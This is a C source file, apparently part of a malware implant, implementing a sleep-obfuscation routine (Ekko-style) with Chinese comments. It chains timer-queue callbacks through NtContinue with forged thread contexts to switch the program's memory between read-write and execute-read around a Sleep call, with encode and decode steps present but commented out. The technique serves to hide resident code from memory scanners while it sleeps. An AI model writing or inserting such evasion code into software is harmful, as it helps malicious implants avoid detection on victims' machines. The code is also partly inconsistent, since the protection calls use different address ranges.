#include "SleepObf.h"
#include "PEBWalk.h"
#include "Memory.h"
#include "NativeDefs.h"


bool EventSet(void* event) {
    if (!API.NtSetEvent(event, 0)) {
        return true;
    }

    return false;
}

void SleepObf(uint32_t time) {
    if (time < 700) {
        return;
    }

    // 创建 Timer 队列
    void* hTimerQueue;
    if (!API.RtlCreateTimerQueue(&hTimerQueue)) {
        // 设定事件，用于等待保证运行顺序
        void* EvtWait = 0;
        void* EvtAwake = 0;
        if (!API.NtCreateEvent(&EvtWait, 0x1F0003, 0, NotificationEvent, false) &&
            !API.NtCreateEvent(&EvtAwake, 0x1F0003, 0, NotificationEvent, false)
        ) {
            struct CONTEXT* OriginCtx = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
            void* hTimer = 0;
            if (!API.RtlCreateTimer(hTimerQueue , &hTimer, (WAITORTIMERCALLBACK)API.RtlCaptureContext, (void*)OriginCtx, 0, 0, 0x00000020)) {
                
                // 开始布置睡眠混淆
                struct CONTEXT* Waiting = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Waiting, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ProtRW = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ProtRW, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Encode = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Encode, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ToSleep = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ToSleep, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Decode = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Decode, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ProtRX = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ProtRX, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Awaking = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Awaking, OriginCtx, sizeof(struct CONTEXT));

                
                Waiting->Rip = API.WaitForSingleObjectEx;
                Waiting->Rcx = EvtWait;
                Waiting->Rdx = 0xffffffff;
                Waiting->R8 = false;

                uint64_t ProtVal = 0;
                ProtRW->Rip = API.VirtualProtect;
                ProtRW->Rcx = ImageAddress;
                ProtRW->Rdx = ImageSize;
                ProtRW->R8 = 0x04;  // PAGE_READWRITE
                ProtRW->R9 = &ProtVal;
                
                ToSleep->Rip = API.Sleep;
                ToSleep->Rcx = time;

                ProtRX->Rip = API.VirtualProtect;
                ProtRX->Rcx = TextAddress;
                ProtRX->Rdx = TextSize;
                ProtRX->R8 = 0x20;  // PAGE_EXECUTE_READ
                ProtRX->R9 = &ProtVal;

                Awaking->Rip = API.NtSetEvent;
                Awaking->Rcx = EvtAwake;
                Awaking->Rdx = 0;

                // 使用 NtContinue 来触发各种任务
                API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, Waiting, 100, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, ProtRW, 200, 0, 0x00000020);
                // API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, Encode, 300, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, ToSleep, 400, 0, 0x00000020);
                // API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, Decode, 400+time, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, ProtRX, 500+time, 0, 0x00000020);
                API.RtlCreateTimer(hTimerQueue, &hTimer, (WAITORTIMERCALLBACK)API.NtContinue, Awaking, 600+time, 0, 0x00000020);

                // 等待任务完成
                API.NtSignalAndWaitForSingleObject(EvtWait, EvtAwake, false, 0);


                // 回收资源
                uint64_t size = 0;
                MemFree(&Waiting, &size);
                MemFree(&ProtRW, &size);
                // MemFree(&Encode, &size);
                MemFree(&ToSleep, &size);
                // MemFree(&Decode, &size);
                MemFree(&ProtRX, &size);
                MemFree(&Awaking, &size);

                API.NtClose(hTimer);
                API.NtClose(hTimerQueue);
                API.NtClose(EvtWait);
                API.NtClose(EvtAwake);
            }
        }
    }
}